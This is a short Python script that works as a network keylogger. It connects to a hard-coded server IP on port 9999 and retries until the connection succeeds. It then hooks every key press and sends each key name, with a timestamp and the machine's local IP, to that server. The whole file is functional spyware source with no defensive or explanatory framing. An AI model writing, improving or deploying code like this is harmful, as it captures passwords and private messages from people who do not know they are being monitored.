import keyboard
import socket
import time
import datetime

# Set up the client
server_ip = "192.168.169.11"  # Replace with your server's IP
port = 9999
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
while True:
    try:
        client_socket.connect((server_ip, port))
        print(f"Connected to server at {server_ip}:{port}")
        # Get the local IP address of this machine
        local_ip = client_socket.getsockname()[0]
        break
    except Exception as e:
        print(f"Connection failed: {e}. Retrying in 5 seconds...")
        time.sleep(5)

# Function to send keystrokes with timestamps and IP address
def on_key_press(event):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_name = event.name
    # Include the local IP in the message
    message = f"[{timestamp}] [{local_ip}] {key_name}\n"
    try:
        client_socket.send(message.encode())
    except Exception as e:
        print(f"Error sending key: {e}")

# Start logging keystrokes
keyboard.on_press(on_key_press)

# Keep the script running
while True:
    time.sleep(1)